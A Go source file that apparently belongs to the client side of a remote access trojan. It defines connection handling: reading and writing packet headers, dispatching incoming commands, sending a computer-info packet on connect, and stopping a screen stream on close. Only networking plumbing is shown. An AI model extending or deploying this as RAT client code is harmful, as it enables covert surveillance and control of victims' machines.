package main

import (
	"encoding/binary"
	"net"
	"rat/client/network"
	"rat/client/network/header"
)

type Connection struct {
	net.Conn
	network.Writer
	network.Reader
}

var Queue chan OutgoingPacket

func (c *Connection) Init() {
	Queue <- &ComputerInfoPacket{}
}

func (c *Connection) Close() {
	screenStream = false

	c.Conn.Close()
}

func (c *Connection) ReadHeader() (header.PacketHeader, error) {
	var h header.PacketHeader
	err := binary.Read(c, network.ByteOrder, &h)

	return h, err
}

func (c *Connection) WriteHeader(header header.PacketHeader) error {
	return binary.Write(c.Conn, network.ByteOrder, header)
}

func (c *Connection) WritePacket(packet OutgoingPacket) error {
	err := c.WriteHeader(packet.Header())

	if err != nil {
		return err
	}

	return c.Writer.WritePacket(packet)
}

type IncomingPacket interface {
	OnReceive() error
}

type OutgoingPacket interface {
	Init()
	Header() header.PacketHeader
}

func (c Connection) ReadPacket() (IncomingPacket, error) {
	header, err := c.ReadHeader()
	if err != nil {
		return nil, err
	}

	packet := GetIncomingPacket(header)

	e, err := c.Reader.ReadPacket(packet)
	if err != nil {
		return nil, err
	}

	return e.(IncomingPacket), e.(IncomingPacket).OnReceive()
}
